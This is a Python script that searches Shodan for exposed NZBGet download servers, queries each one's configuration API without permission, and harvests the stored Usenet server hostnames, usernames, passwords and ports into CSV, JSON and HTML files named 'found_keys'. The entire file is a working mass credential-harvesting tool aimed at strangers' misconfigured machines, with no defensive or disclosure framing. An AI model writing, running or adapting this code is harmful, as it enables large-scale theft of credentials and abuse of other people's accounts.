import csv
import json
from io import TextIOWrapper
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

import tqdm
import pynzbgetapi
import requests
import logging
from dotenv import load_dotenv
from shodan import Shodan
from colorama import init, Fore, Style

# Initialize colorama
init()

# Load environment variables from .env file
load_dotenv()

# Configure logging to log to both file and console
logging.basicConfig(level=logging.CRITICAL,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler('app.log'),
                        logging.StreamHandler()
                    ])

def extract_hostnames(csv_file_path):
    hostnames = []
    try:
        with open(csv_file_path, 'r', newline='') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if row:  # Ensure the row is not empty
                    hostnames.append(row[0])
    except FileNotFoundError:
        logging.error(f"File not found: {csv_file_path}")
    except Exception as e:
        logging.error(f"An error occurred while reading the CSV file: {e}")
    return hostnames

def search_for_keys(url, output_file: TextIOWrapper, existing_hosts: set):
    logging.info(f"Now searching {url}")
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }

        ng_api = pynzbgetapi.NZBGetAPI(url, timeout=5)
        json_response = ng_api.config()
        servers_found = 0
        current_host = None
        for item in json_response:
            if item['Name'].startswith('Server'):
                property_name = item["Name"].split(".", 1)[1]
                if property_name == 'Host':
                    current_host = item['Value']
                    servers_found += 1
                    if current_host not in existing_hosts:
                        output_file.write('\n')
                        existing_hosts.add(current_host)
                    else:
                        current_host = None
                        break

                if current_host and property_name in ['Host', 'Username', 'Password', 'Port']:
                    output_file.write(item['Value'] + ';')
                if current_host and property_name == 'Connections':
                    output_file.write(item['Value'])

        output_file.flush()
        logging.info(f"Found {servers_found} servers in {url}")

    except requests.exceptions.Timeout:
        logging.warning(f"Connection to {url} timed out after 5 seconds.")
        raise  # Re-raise the exception to be caught by the caller
    except Exception as e:
        logging.error(f"An error occurred while trying to get {url}: {e}")
        raise  # Re-raise the exception to be caught by the caller

def main(csv_file_path, output_file_path):
    hostnames = extract_hostnames(csv_file_path)

    # Read existing hosts from the output file
    existing_hosts = set()
    if os.path.isfile(output_file_path):
        with open(output_file_path, 'r') as output_file:
            next(output_file)  # Skip the header line
            for line in output_file:
                host = line.strip().split(';')[0]
                existing_hosts.add(host)

    with open(output_file_path, 'a') as output_file:
        if not existing_hosts:
            output_file.write("Host;Port;Username;Password;Connections\n")

        successful_searches = 0
        unsuccessful_searches = 0

        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {
                executor.submit(search_for_keys,
                                hostname,
                                output_file,
                                existing_hosts): hostname for hostname in hostnames if hostname not in existing_hosts}

            with tqdm.tqdm(total=len(future_to_url), desc="Processing Hosts", unit="host", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        successful_searches += 1
                    except Exception as e:
                        logging.error(f"An error occurred while processing {url}: {e}")
                        unsuccessful_searches += 1
                    pbar.update(1)

        logging.info("Search completed.")
        logging.info(f"Successful searches: {successful_searches}")
        logging.info(f"Unsuccessful searches: {unsuccessful_searches}")

        print(f"\n{Fore.GREEN}Search completed.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful searches:{Style.RESET_ALL} {successful_searches}")
        print(f"{Fore.RED}Unsuccessful searches:{Style.RESET_ALL} {unsuccessful_searches}")

    # Generate JSON output
    results = []
    unique_hosts = set()
    with open(output_file_path, 'r') as output_file:
        reader = csv.DictReader(output_file, delimiter=';')
        for row in reader:
            host_key = f"{row['Host']}:{row['Port']}"
            if host_key not in unique_hosts:
                results.append(row)
                unique_hosts.add(host_key)

    with open('results.json', 'w') as json_file:
        json.dump(results, json_file, indent=4)

    print(f"{Fore.GREEN}JSON output generated: results.json{Style.RESET_ALL}")

    # Generate HTML output
    with open('results.html', 'w') as html_file:
        html_file.write('<!DOCTYPE html>\n')
        html_file.write('<html>\n')
        html_file.write('<head>\n')
        html_file.write('  <title>Results</title>\n')
        html_file.write('  <style>\n')
        html_file.write('    table {\n')
        html_file.write('      border-collapse: collapse;\n')
        html_file.write('      width: 100%;\n')
        html_file.write('    }\n')
        html_file.write('    th, td {\n')
        html_file.write('      text-align: left;\n')
        html_file.write('      padding: 8px;\n')
        html_file.write('    }\n')
        html_file.write('    tr:nth-child(even) {background-color: #f2f2f2;}\n')
        html_file.write('  </style>\n')
        html_file.write('</head>\n')
        html_file.write('<body>\n')
        html_file.write('  <h2>Results</h2>\n')
        html_file.write('  <table>\n')
        html_file.write('    <tr>\n')
        html_file.write('      <th>Host</th>\n')
        html_file.write('      <th>Port</th>\n')
        html_file.write('      <th>Username</th>\n')
        html_file.write('      <th>Password</th>\n')
        html_file.write('      <th>Connections</th>\n')
        html_file.write('    </tr>\n')

        for result in results:
            html_file.write('    <tr>\n')
            html_file.write(f'      <td>{result["Host"]}</td>\n')
            html_file.write(f'      <td>{result["Port"]}</td>\n')
            html_file.write(f'      <td>{result["Username"]}</td>\n')
            html_file.write(f'      <td>{result["Password"]}</td>\n')
            html_file.write(f'      <td>{result["Connections"]}</td>\n')
            html_file.write('    </tr>\n')

        html_file.write('  </table>\n')
        html_file.write('</body>\n')
        html_file.write('</html>\n')

    print(f"{Fore.GREEN}HTML output generated: results.html{Style.RESET_ALL}")

def download_hosts():
    try:
        # Get the Shodan API key from the environment variable
        api_key = os.getenv('SHODAN_API_KEY')
        if not api_key:
            raise ValueError("Shodan API key not found in the environment variables.")

        # Initialize the Shodan API client
        shodan_api = Shodan(api_key)

        print(f"{Fore.YELLOW}Searching Shodan for hosts...{Style.RESET_ALL}")

        # Search Shodan for "nzbget 200 ok"
        results = shodan_api.search_cursor("nzbget 200 ok")

        # Extract the hostnames and ports from the search results
        hostnames_ports = []
        with tqdm.tqdm(desc="Shodan Search Progress", unit="result", bar_format="{l_bar}{bar}| {n_fmt} results [{elapsed}<{remaining}]") as pbar:
            for result in results:
                hostnames_ports.append(f"{result['ip_str']}:{result['port']}")
                pbar.update(1)

        print(f"{Fore.GREEN}Shodan search completed.{Style.RESET_ALL}")

        # Save results to file
        if hostnames_ports:
            with open('shodan_results.txt', 'w') as f:
                for item in tqdm.tqdm(hostnames_ports, desc="Saving Hosts", unit="host", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"):
                    f.write("%s\n" % item)

            print(f"{Fore.GREEN}Fresh list of hosts downloaded from Shodan.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No hosts found in Shodan search.{Style.RESET_ALL}")

    except Exception as e:
        logging.error(f"An error occurred while downloading hosts from Shodan: {e}")

def simple_tui():
    download_hosts()
    csv_file_name = 'shodan_results.txt'

    if os.path.isfile(csv_file_name):
        csvfilepaths = csv_file_name
        outfilepathpath = 'found_keys.csv'

        main(csvfilepaths, outfilepathpath)
    else:
        print(f"{Fore.RED}File not found: {csv_file_name}{Style.RESET_ALL}")

if __name__ == '__main__':
    try:
        simple_tui()
    except KeyboardInterrupt:
        logging.info("Program interrupted by user.")
    except Exception as e:
        logging.critical(f"An unexpected error occurred: {e}")
